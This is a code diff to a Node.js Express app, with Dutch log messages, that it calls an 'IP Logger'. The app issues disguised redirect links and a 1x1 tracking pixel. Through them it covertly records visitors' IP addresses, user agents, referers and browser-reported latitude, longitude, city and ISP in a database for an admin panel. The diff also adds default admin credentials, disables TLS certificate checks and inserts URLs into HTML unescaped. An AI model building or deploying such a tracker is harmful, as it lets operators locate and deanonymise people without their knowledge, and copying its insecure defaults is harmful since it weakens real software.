@@ -3,19 +3,204 @@ const dotenv = require('dotenv');
 const uaParser = require('ua-parser-js');
 const basicAuth = require('express-basic-auth');
 const fs = require('fs');
+const path = require('path');
+const { Pool } = require('pg');
 
 dotenv.config();
 
 const app = express();
 app.use(express.static('public'));
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 const auth = basicAuth({
-  users: { [process.env.ADMIN_USER]: process.env.ADMIN_PASS },
+  users: { [process.env.ADMIN_USER || 'admin']: process.env.ADMIN_PASS || 'change_me' },
   challenge: true
 });
 
-// === MOEIE LANDING PAGE ===
+const TRACKERS_FILE = path.join(__dirname, 'trackers.json');
+const LOG_FILE = path.join(__dirname, 'logs.txt');
+const DEFAULT_REDIRECT_URL = process.env.DEFAULT_REDIRECT_URL || 'https://youtube.com';
+const MAX_LOG_ROWS = 500;
+
+let pool = null;
+let useDb = false;
+
+function getClientIp(req) {
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+  return ip.replace(/^::ffff:/, '') || 'Unknown';
+}
+
+async function initDatabase() {
+  if (!process.env.DATABASE_URL) {
+    console.log('⚠️ Geen DATABASE_URL gevonden, gebruik fallback file storage.');
+    return;
+  }
+
+  const config = {
+    connectionString: process.env.DATABASE_URL,
+    ssl: process.env.DB_SSL === 'false' ? false : { rejectUnauthorized: false }
+  };
+
+  try {
+    pool = new Pool(config);
+    await pool.query('SELECT 1');
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS trackers (
+        tracker_id text PRIMARY KEY,
+        name text NOT NULL,
+        destination_url text NOT NULL,
+        created_at timestamptz NOT NULL DEFAULT now(),
+        updated_at timestamptz NOT NULL DEFAULT now()
+      );
+    `);
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS logs (
+        id serial PRIMARY KEY,
+        tracker_id text NOT NULL,
+        tracker_name text,
+        timestamp timestamptz NOT NULL DEFAULT now(),
+        ip text,
+        country text,
+        city text,
+        isp text,
+        browser text,
+        os text,
+        device text,
+        useragent text,
+        referer text,
+        latitude numeric,
+        longitude numeric,
+        is_pixel boolean DEFAULT false
+      );
+    `);
+    useDb = true;
+    console.log('? Postgres connectie actief. Opslag via database.');
+  } catch (error) {
+    console.error('? Database connectie mislukt. Gebruik fallback file storage.', error.message);
+    pool = null;
+    useDb = false;
+  }
+}
+
+async function readTrackersFile() {
+  if (!fs.existsSync(TRACKERS_FILE)) return [];
+  try {
+    return JSON.parse(fs.readFileSync(TRACKERS_FILE, 'utf8'));
+  } catch (error) {
+    console.error('Fout bij lezen trackers.json:', error);
+    return [];
+  }
+}
+
+async function writeTrackersFile(trackers) {
+  fs.writeFileSync(TRACKERS_FILE, JSON.stringify(trackers, null, 2));
+}
+
+async function loadTrackers() {
+  if (useDb) {
+    const { rows } = await pool.query('SELECT tracker_id, name, destination_url, created_at, updated_at FROM trackers ORDER BY created_at DESC');
+    return rows;
+  }
+  return readTrackersFile();
+}
+
+async function loadTrackerById(trackerId) {
+  if (useDb) {
+    const { rows } = await pool.query('SELECT tracker_id, name, destination_url FROM trackers WHERE tracker_id = $1', [trackerId]);
+    return rows[0];
+  }
+  const trackers = await readTrackersFile();
+  return trackers.find(t => t.tracker_id === trackerId);
+}
+
+async function saveTracker({ tracker_id, name, destination_url }) {
+  if (useDb) {
+    await pool.query(`
+      INSERT INTO trackers (tracker_id, name, destination_url, created_at, updated_at)
+      VALUES ($1, $2, $3, now(), now())
+      ON CONFLICT (tracker_id) DO UPDATE SET
+        name = EXCLUDED.name,
+        destination_url = EXCLUDED.destination_url,
+        updated_at = now();
+    `, [tracker_id, name, destination_url]);
+    return;
+  }
+
+  const trackers = await readTrackersFile();
+  const existingIndex = trackers.findIndex(t => t.tracker_id === tracker_id);
+  if (existingIndex >= 0) {
+    trackers[existingIndex] = { tracker_id, name, destination_url, created_at: trackers[existingIndex].created_at, updated_at: new Date().toISOString() };
+  } else {
+    trackers.push({ tracker_id, name, destination_url, created_at: new Date().toISOString(), updated_at: new Date().toISOString() });
+  }
+  writeTrackersFile(trackers);
+}
+
+async function appendLog(log) {
+  if (useDb) {
+    await pool.query(`
+      INSERT INTO logs
+      (tracker_id, tracker_name, timestamp, ip, country, city, isp, browser, os, device, useragent, referer, latitude, longitude, is_pixel)
+      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15)
+    `, [
+      log.tracker_id,
+      log.tracker_name,
+      log.timestamp,
+      log.ip,
+      log.country,
+      log.city,
+      log.isp,
+      log.browser,
+      log.os,
+      log.device,
+      log.useragent,
+      log.referer,
+      log.latitude,
+      log.longitude,
+      log.is_pixel || false
+    ]);
+    return;
+  }
+
+  fs.appendFileSync(LOG_FILE, JSON.stringify(log) + '\n');
+}
+
+async function getLogs() {
+  if (useDb) {
+    const { rows } = await pool.query('SELECT * FROM logs ORDER BY timestamp DESC LIMIT $1', [MAX_LOG_ROWS]);
+    return rows;
+  }
+
+  if (!fs.existsSync(LOG_FILE)) return [];
+  const data = fs.readFileSync(LOG_FILE, 'utf8');
+  return data.trim().split('\n').filter(Boolean).map(line => {
+    try { return JSON.parse(line); } catch { return null; }
+  }).filter(Boolean).reverse();
+}
+
+async function getSummary() {
+  if (useDb) {
+    const trackerCount = await pool.query('SELECT COUNT(*) FROM trackers');
+    const visitCount = await pool.query('SELECT COUNT(*) FROM logs');
+    const uniqueCount = await pool.query('SELECT COUNT(DISTINCT ip) FROM logs');
+    return {
+      totalTrackers: parseInt(trackerCount.rows[0].count, 10),
+      totalVisits: parseInt(visitCount.rows[0].count, 10),
+      uniqueVisits: parseInt(uniqueCount.rows[0].count, 10)
+    };
+  }
+
+  const trackers = await readTrackersFile();
+  const logs = await getLogs();
+  const uniqueIps = new Set(logs.map(l => l.ip).filter(Boolean));
+  return {
+    totalTrackers: trackers.length,
+    totalVisits: logs.length,
+    uniqueVisits: uniqueIps.size
+  };
+}
+
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -45,33 +230,24 @@ app.get('/', (req, res) => {
   `);
 });
 
-// === TRACKER ===
-// Helper voor tracker redirect
 async function handleTrackerRedirect(trackerId, res) {
-  let destinationUrl = "https://youtube.com"; // fallback
-
+  let destinationUrl = DEFAULT_REDIRECT_URL;
   try {
-    if (fs.existsSync('trackers.json')) {
-      const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
-      const tracker = trackers.find(t => t.tracker_id === trackerId);
-
-      if (tracker && tracker.destination_url) {
-        destinationUrl = tracker.destination_url;
-        console.log(`✅ Bestemming gevonden: ${destinationUrl}`);
-      } else {
-        console.log(`⚠️ Geen bestemming gevonden voor tracker: ${trackerId}`);
-      }
+    const tracker = await loadTrackerById(trackerId);
+    if (tracker && tracker.destination_url) {
+      destinationUrl = tracker.destination_url;
+      console.log(`✅ Bestemming gevonden: ${destinationUrl}`);
     } else {
-      console.log("⚠️ trackers.json bestaat niet");
+      console.log(`⚠️ Geen bestemming gevonden voor tracker: ${trackerId}`);
     }
   } catch (error) {
-    console.error("Fout bij ophalen destination:", error);
+    console.error('Fout bij ophalen tracker:', error);
   }
 
   console.log(`🔄 Redirect naar: ${destinationUrl}`);
 
-  let html = fs.readFileSync(__dirname + '/views/redirect.html', 'utf8');
-  html = html.replace("{{DESTINATION_URL}}", destinationUrl);
+  let html = fs.readFileSync(path.join(__dirname, 'views', 'redirect.html'), 'utf8');
+  html = html.replace('{{DESTINATION_URL}}', destinationUrl).replace('{{TRACKER_ID}}', trackerId);
   res.send(html);
 }
 
@@ -79,32 +255,51 @@ app.get('/track/:id', async (req, res) => {
   await handleTrackerRedirect(req.params.id, res);
 });
 
-// === API: Geo data vanuit browser opslaan ===
-app.post('/api/log-geo', (req, res) => {
-  const { tracker_id, ip, country, city, isp, lat, lon } = req.body;
+app.get('/pixel/:trackerId.png', async (req, res) => {
+  try {
+    const tracker = await loadTrackerById(req.params.trackerId);
+    const log = {
+      timestamp: new Date().toISOString(),
+      tracker_id: req.params.trackerId,
+      tracker_name: tracker?.name || 'Onbekend',
+      ip: getClientIp(req),
+      country: 'Unknown',
+      city: 'Unknown',
+      isp: 'Unknown',
+      browser: 'Pixel',
+      os: 'Pixel',
+      device: 'Pixel',
+      useragent: req.headers['user-agent'] || 'Unknown',
+      referer: req.headers.referer || 'None',
+      latitude: null,
+      longitude: null,
+      is_pixel: true
+    };
+    await appendLog(log);
+  } catch (error) {
+    console.error('Pixel logging error:', error);
+  }
 
-  if (!tracker_id) return res.status(400).json({ error: "No tracker_id" });
+  const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/w8AAn8B9q7xVQAAAABJRU5ErkJggg==', 'base64');
+  res.setHeader('Content-Type', 'image/png');
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.send(pixel);
+});
+
+app.post('/api/log-geo', async (req, res) => {
+  const { tracker_id, ip: clientIp, country, city, isp, lat, lon } = req.body;
+  if (!tracker_id) return res.status(400).json({ error: 'No tracker_id' });
 
   try {
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const parser = uaParser(userAgent);
-
-    let trackerName = 'Onbekend';
-    if (fs.existsSync('trackers.json')) {
-      try {
-        const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
-        const tracker = trackers.find(t => t.tracker_id === tracker_id);
-        if (tracker && tracker.name) trackerName = tracker.name;
-      } catch (e) {
-        console.error('Error loading trackers.json for log-geo:', e);
-      }
-    }
+    const tracker = await loadTrackerById(tracker_id);
 
     const log = {
       timestamp: new Date().toISOString(),
-      tracker_id: tracker_id,
-      tracker_name: trackerName,
-      ip: ip || 'Unknown',
+      tracker_id,
+      tracker_name: tracker?.name || 'Onbekend',
+      ip: clientIp || getClientIp(req),
       country: country || 'Unknown',
       city: city || 'Unknown',
       isp: isp || 'Unknown',
@@ -114,109 +309,96 @@ app.post('/api/log-geo', (req, res) => {
       useragent: userAgent,
       referer: req.headers.referer || 'Direct',
       latitude: lat || null,
-      longitude: lon || null
+      longitude: lon || null,
+      is_pixel: false
     };
+    await appendLog(log);
+    console.log(`📍 Log opgeslagen → ${log.tracker_name} | ${log.country} - ${log.city}`);
 
-    fs.appendFileSync('logs.txt', JSON.stringify(log) + '\n');
-    console.log(`📍 Browser Geo opgeslagen → ${trackerName} | ${country} - ${city} (${lat}, ${lon})`);
     res.json({ success: true });
-  } catch (e) {
-    console.error("Geo save error:", e);
-    res.status(500).json({ error: "Save failed" });
+  } catch (error) {
+    console.error('Geo save error:', error);
+    res.status(500).json({ error: 'Save failed' });
   }
 });
 
-// === API: Tracker opslaan ===
-app.post('/api/save-tracker', auth, (req, res) => {
+app.post('/api/save-tracker', auth, async (req, res) => {
   const { tracker_id, name, destination_url } = req.body;
-
   if (!tracker_id || !name || !destination_url) {
-    return res.status(400).json({ error: "Missing required fields" });
+    return res.status(400).json({ error: 'Missing required fields' });
   }
 
   try {
-    let trackers = [];
-    if (fs.existsSync('trackers.json')) {
-      trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
-    }
-
-    // Check if tracker already exists
-    const existingIndex = trackers.findIndex(t => t.tracker_id === tracker_id);
-    if (existingIndex >= 0) {
-      trackers[existingIndex] = { tracker_id, name, destination_url, created_at: trackers[existingIndex].created_at, updated_at: new Date().toISOString() };
-    } else {
-      trackers.push({ tracker_id, name, destination_url, created_at: new Date().toISOString() });
-    }
-
-    fs.writeFileSync('trackers.json', JSON.stringify(trackers, null, 2));
-    console.log(`✅ Tracker opgeslagen: ${tracker_id}`);
+    await saveTracker({ tracker_id, name, destination_url });
+    console.log(`? Tracker opgeslagen: ${tracker_id}`);
     res.json({ success: true, tracker_id, link: `/${tracker_id}` });
-  } catch (e) {
-    console.error("Save tracker error:", e);
-    res.status(500).json({ error: "Save failed" });
+  } catch (error) {
+    console.error('Save tracker error:', error);
+    res.status(500).json({ error: 'Save failed' });
   }
 });
 
-// === API: Trackers ophalen ===
-app.get('/api/trackers', auth, (req, res) => {
+app.get('/api/trackers', auth, async (req, res) => {
   try {
-    if (fs.existsSync('trackers.json')) {
-      const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
-      res.json(trackers);
-    } else {
-      res.json([]);
-    }
-  } catch (e) {
-    res.status(500).json({ error: "Load failed" });
+    const trackers = await loadTrackers();
+    res.json(trackers);
+  } catch (error) {
+    console.error('Load trackers error:', error);
+    res.status(500).json({ error: 'Load failed' });
   }
 });
 
-// === ADMIN ===
-app.get('/admin', auth, (req, res) => {
-  res.sendFile(__dirname + '/views/admin.html');
+app.get('/api/summary', auth, async (req, res) => {
+  try {
+    const summary = await getSummary();
+    res.json(summary);
+  } catch (error) {
+    console.error('Summary error:', error);
+    res.status(500).json({ error: 'Summary failed' });
+  }
 });
 
-app.get('/api/logs', auth, (req, res) => {
-  if (fs.existsSync('logs.txt')) {
-    const data = fs.readFileSync('logs.txt', 'utf8');
-    const logs = data.trim().split('\n').filter(Boolean).map(line => JSON.parse(line));
+app.get('/admin', auth, (req, res) => {
+  res.sendFile(path.join(__dirname, 'views', 'admin.html'));
+});
 
-    let trackerMap = {};
-    if (fs.existsSync('trackers.json')) {
-      try {
-        const trackers = JSON.parse(fs.readFileSync('trackers.json', 'utf8'));
-        trackerMap = trackers.reduce((acc, tracker) => {
-          acc[tracker.tracker_id] = tracker;
-          return acc;
-        }, {});
-      } catch (e) {
-        console.error('Error loading trackers.json:', e);
-      }
+app.get('/api/logs', auth, async (req, res) => {
+  try {
+    const logs = await getLogs();
+    if (!useDb) {
+      const trackers = await readTrackersFile();
+      const trackerMap = trackers.reduce((acc, tracker) => {
+        acc[tracker.tracker_id] = tracker;
+        return acc;
+      }, {});
+      return res.json(logs.map(log => ({
+        ...log,
+        name: log.tracker_name || trackerMap[log.tracker_id]?.name || 'Onbekend'
+      })));
     }
 
-    const logsWithNames = logs.map(log => ({
+    res.json(logs.map(log => ({
       ...log,
-      name: log.tracker_name || trackerMap[log.tracker_id]?.name || 'Onbekend'
-    }));
-
-    res.json(logsWithNames.reverse());
-  } else {
-    res.json([]);
+      name: log.tracker_name || 'Onbekend'
+    })));
+  } catch (error) {
+    console.error('Load logs error:', error);
+    res.status(500).json({ error: 'Load failed' });
   }
 });
 
 app.get('/:trackerId', async (req, res, next) => {
-  const reserved = ['api', 'admin', 'favicon.ico'];
+  const reserved = ['api', 'admin', 'favicon.ico', 'pixel'];
   const trackerId = req.params.trackerId;
-
   if (reserved.includes(trackerId.toLowerCase())) {
     return next();
   }
-
   await handleTrackerRedirect(trackerId, res);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`✅ IP Logger draait op poort ${PORT}`);
+initDatabase().then(() => {
+  app.listen(PORT, () => {
+    console.log(`? IP Logger draait op poort ${PORT}`);
+  });
 });
